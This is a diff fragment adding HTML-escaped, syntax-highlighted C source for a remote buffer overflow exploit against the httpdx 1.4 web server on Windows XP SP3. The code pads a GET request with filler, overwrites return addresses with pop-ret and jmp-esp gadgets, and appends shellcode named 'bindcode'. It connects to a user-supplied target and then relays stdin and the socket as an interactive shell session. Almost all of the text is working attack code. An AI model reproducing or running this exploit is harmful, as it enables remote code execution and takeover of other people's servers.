+        &lt;span class=&quot;n&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rfds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FD_ISSET&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rfds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;l&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; - Connection closed by local user&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EXIT_FAILURE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;write&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FD_ISSET&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rfds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;l&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; - Connection closed by remote host.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EXIT_FAILURE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; - Read failure&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EXIT_FAILURE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;write&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x64f8134b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// pop ret (core.dll)&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x63b8624f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Required to reach ret instruction&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7c86467b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// jmp esp (kernel32.dll)&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sockaddr_in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;---------------------------------------------------------------------&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot; [*] httpdx 1.4 GET Request Remote Buffer Overflow Exploit (0day) &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot; [*] Written and discovered by Pankaj Kohli &amp;lt;http://www.codepwn.com&amp;gt; &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot; [*] Tested with httpdx 1.4 on Windows XP SP3 &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;[-] Usage: %s &amp;lt;Target IP&amp;gt; &amp;lt;Port&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;atoi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;[+] Creating payload &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;strcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;GET /abc=&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;616&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;625&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;strcat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bindcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;765&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;244&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1009&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;strcat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot; HTTP/1.1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Host: 192.168.2.1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;[+] Connecting to %s on port %s &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sin_family&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sin_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inet_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sin_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;htons&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;perror&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;[-] Socket &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sockaddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;perror&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;[-] Connect &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
